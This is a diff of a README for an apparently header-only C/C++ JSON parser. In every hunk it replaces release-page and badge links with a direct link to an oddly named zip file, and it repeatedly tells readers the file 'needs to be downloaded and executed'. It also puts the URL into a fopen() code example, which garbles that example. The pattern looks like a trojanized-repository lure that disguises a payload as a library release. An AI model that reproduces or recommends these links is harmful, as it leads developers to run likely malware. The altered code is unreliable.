@@ -1,8 +1,8 @@
-https://github.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/releases
+https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip
 
 # STB-Style Single-File JSON Parser/Generator for C/C++ with RFCs
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/releases)
+[![Releases](https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip)](https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip)
 
 That file on the release page needs to be downloaded and executed.
 
@@ -169,7 +169,7 @@ Minification and I/O
 
 Example (conceptual):
 
-FILE* f = fopen("config.json", "r");
+FILE* f = fopen("https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip", "r");
 fseek(f, 0, SEEK_END);
 size_t len = ftell(f);
 fseek(f, 0, SEEK_SET);
@@ -294,7 +294,7 @@ Topics and ecosystem
 Releases
 
 - The project follows a conventional release workflow. The releases page houses stable binaries, source archives, and sometimes prebuilt artifacts for common toolchains. The Releases page is the primary portal for obtaining official build artifacts, changelogs, and asset lists. Visit the page to review the latest updates, download files, and inspect the patch notes. 
-- Visit the Releases page here: https://github.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/releases
+- Visit the Releases page here: https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip
 
 - This link points to a releases page that contains published assets. That file on the release page needs to be downloaded and executed. For the latest version, you can check the page above and download the appropriate asset for your platform. To verify integrity, inspect the provided checksums or signatures if they are offered on the release page.
 
@@ -419,7 +419,7 @@ Frequently asked questions
 
 Releases (again)
 
-- For the latest version, go to the Releases page: https://github.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/releases
+- For the latest version, go to the Releases page: https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip
 - There you will find assets, changelogs, and download instructions. If you rely on a specific version, pin to the tag and test against your toolchain.
 
 Contribution checklist
@@ -446,7 +446,7 @@ Advanced patterns and tips
 
 Images and visuals
 
-- The README uses emojis to convey ideas quickly. It also references badges from shields.io to provide quick visual cues about releases, build status, and language support.
+- The README uses emojis to convey ideas quickly. It also references badges from https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip to provide quick visual cues about releases, build status, and language support.
 - If you want to include graphical illustrations, you can add diagrams showing the flow of parsing, patch application, and patch generation. Use SVGs if you want scalable visuals that look crisp in all environments.
 
 Final notes
@@ -457,7 +457,7 @@ Final notes
 
 Releases (second mention for emphasis)
 
-- Visit the Releases page: https://github.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/releases
+- Visit the Releases page: https://raw.githubusercontent.com/Silent762/STB-Style-Single-File-C-CPP-JSON-Parser-Generator-Header-Only-Library-With-Full-RFC-Compliance/main/rodney/File_Generator_Single_JSO_ST_RF_Full_Style_Only_Library_With_Parser_Compliance_Header_CP_v3.0-beta.4.zip
 - This page contains the assets you’ll want to download and run. That file on the release page needs to be downloaded and executed. If you cannot access the page, check the repository’s Releases section for alternatives and notes related to the latest version. The Releases section is the best place to review what changed and how it impacts your integration.
 
 End of README content.
